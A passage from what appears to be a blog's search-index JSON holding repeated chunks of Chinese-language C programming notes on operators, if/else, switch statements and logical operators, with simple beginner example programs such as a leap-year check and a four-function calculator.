1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌入式赋值"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结合关系"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#递增递减运算符"},{"categories":["Programing"],"content":"\r2.2表达式一个表达式是一系列运算符和算子的组合，用来计算一个值 运算符operator，是指进行运算的动作，比如加法运算符“+”。 算子operand，是指参与运算的值，这个值可能是常数，也可能是变量，还可能是一个方法的返回值 计算时间差 #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int t1 = hour1 * 60 + minute1; int t2 = hour2 * 60 + minute2; int t = t1 - t2; printf(\"时间差是%d小时，%d分钟。\", t / 60, t % 60); return(0); 求平均值 #include int main() { int a, b; scanf_s(\"%d %d\", \u0026a, \u0026b); double c = (a + b) / 2.0; printf(\"%d和%d的平均值=%f\\n\", a, b, c); return(0); } 运算符优先级\r单目运算符只有一个算子，如：+a，-b（正a，负b） 嵌入式赋值(不利于阅读，容易产生错误，不建议使用) int a = 6; int b; int c = 1 + (b = a); 结合关系一般是自左向右 而单目运算(+-)和赋值(=)是自右向左 递增递减运算符“++”和“–”是两个很特殊的运算符，它们是单目运算符，这个算子还必须是变量 前缀和后缀++和–可以放在变量的前面，叫做前缀形式，也可以放在变量的后面，叫做后缀形 在同一行代码中，++在前，则表达式中为++以后的值，若++在后，表达式中为++以前的值 ","date":"2023-11-17","objectID":"/c_language_notes/:2:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#前缀和后缀"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include\u003cstdio.h\u003e int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include\u003cstdio.h\u003e int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include\u003cstdio.h\u003e int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include\u003cmath.h\u003e 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#31判断"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#时间差计算通过if语句改进"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#if语句"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#关系运算符"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#关系运算的结果"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#找零计算器"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#判断闰年"},{"categories":["Programing"],"content":"\r3.1判断\r时间差计算(通过if语句改进) #include int main() { int hour1, minute1; int hour2, minute2; scanf_s(\"%d %d\", \u0026hour1, \u0026minute1); scanf_s(\"%d %d\", \u0026hour2, \u0026minute2); int ih = hour2 - hour1; int im = minute2 - minute1; if (im \u003c 0) { im = im + 60; ih--; } printf(\"时间差是%d小时%d分钟\", ih, im); } if语句 if(条件成立){ ... } 关系运算符\r关系运算的结果\r找零计算器 #include int main() { int bill = 0; int price = 0; printf(\"请输入金额：\"); scanf_s(\"%d\", \u0026price); printf(\"请输入票面：\"); scanf_s(\"%d\", \u0026bill); if (bill \u003e= price) { printf(\"应该找您%d元\\n\", bill - price); } else { printf(\"你的钱不够\\n\"); } } 判断闰年 #include int main(){ int n=0; printf(\"请输入年份：\"); scanf(\"%d\",\u0026n); if(n%100==0){ if(n%400==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } }else{ if(n%4==0){ printf(\"是闰年\"); }else{ printf(\"不是闰年\"); } } return 0; } 常用的数学函数：调用数学函数，需要加入#include 平方根函数：sqrt(x) 绝对值函数：fabs(x) 幂函数：pow(x,n)，x的n次方 指数函数：exp(x)，e^x ln函数：log(x)，计算lnx ","date":"2023-11-17","objectID":"/c_language_notes/:3:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常用的数学函数"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include\u003cstdio.h\u003e int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include\u003cstdio.h\u003e int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#32分支"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套的判断"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#else的匹配"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#级联的if-else-if"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: ... break; case 常量: ... break; default: ... break; } 控制表达式只能是整数型结果 常量，可以是常数，也可以是表达式 break用来分割case与case，否则之后会进入下一个case switch在每个语句中都是用switch switch语句中如果省略了default，当表达式的值与任何一个常量表达式的值都不相等，则什么都不执行 简单的计算器程序 #include int main(){ int v1,v2; char op; printf(\"Type in an expresseion:\"); scanf(\"%d%c%d\",\u0026v1,\u0026op,\u0026v2); switch(op){ case '+': printf(\"=%d\",v1+v2); break; case '-': printf(\"=%d\",v1-v2); break; case '*': printf(\"=%d\",v1*v2); break; case '/': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1/v2); break; } case '%': if(v2==0){ printf(\"Discover can not be 0!\\n\"); break; }else{ printf(\"=%d\",v1%v2); break; } default: printf(\"Unknow operator\\n\"); break; } return 0; } 字符统计输入一个正整数n，再输入n个字符，分别统计出其中空格和回车、数字字符和其他字符的个数，要求使用switch语句编写： #include int main(){ int n; int blank=0; int digit=0; int other=0; char ch; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); getchar(); //读入并舍弃换行符 printf(\"Enter %d Characters:\",n); for(int i=1;i\u003c=n;i++){ ch=getchar(); switch(ch){ case ' ': case '\\n': blank++; break; case '0':case '1':case '2':case '3':case '4': case '5':case '6':case '7':case '8':case '9': digit++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d\\n\",blank,digit,other); return 0; } 逻辑运算符\r单目：逻辑非：! 双目：逻辑与：\u0026\u0026 逻辑或：|| 逻辑运算符\u0026\u0026和||的优先级低于关系运算符，故： (ch\u003e='a')\u0026\u0026(ch\u003c='z') 等价于 ch\u003e='a'\u0026\u0026ch\u003c='z' ","date":"2023-11-17","objectID":"/c_language_notes/:3:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#if语句常见错误"},{"categories":["Programing"],"content":"\r3.2分支\r嵌套的判断当if的条件满足或者不满足的时候要执行的语句也可以是一条if或if-else语句 if( code == ready ) if ( count \u003c20 ) printf(\"一切正常\\n\"); else printf(\"继续等待\\n\") else的匹配如果不加大括号，else总是和最近的那个if匹配，如果加了大括号，else和内含有if语句的第1个if语句匹配，当然我们也可以通过添加空else语句来闭合if if( code == ready ){ if ( count \u003c20 ) printf(\"一切正常\\n\"); } else printf(\"继续等待\\n\") 级联的if-else if if ( exp1 ) st1; else if ( exp2 ) st2; else st3; if语句常见错误 忘记打括号(大于一条语句) if后面忘记分号(if后面无分号，如果有分号，则相当于已有一条“；”语句) 错误使用==和=(若一个等号，则为赋值) 使人困惑的else switch-case switch (控制表达式){ case 常量: 